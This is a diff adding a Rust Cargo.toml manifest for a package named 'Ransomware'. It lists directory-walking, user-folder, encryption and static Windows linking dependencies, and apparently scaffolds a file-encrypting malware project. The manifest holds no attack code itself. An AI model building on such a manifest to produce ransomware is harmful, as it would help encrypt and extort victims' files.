@@ -1,0 +1,20 @@
+[package]
+name = "Ransomware"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+walkdir = "2.3"
+dirs = "4.0"
+rust-crypto = "0.2"
+orion = "0.17.6"
+rand_core = { version = "0.6.4", features = ["getrandom"] }
+static_vcruntime = "2.0"
+
+
+[target.'cfg(windows)'.build-dependencies]
+static_vcruntime = { version = "2", optional = true }
+
+
+[target.'cfg(all(windows, target_env = "msvc"))']
+rustflags = ["-C", "target-feature=+crt-static"]
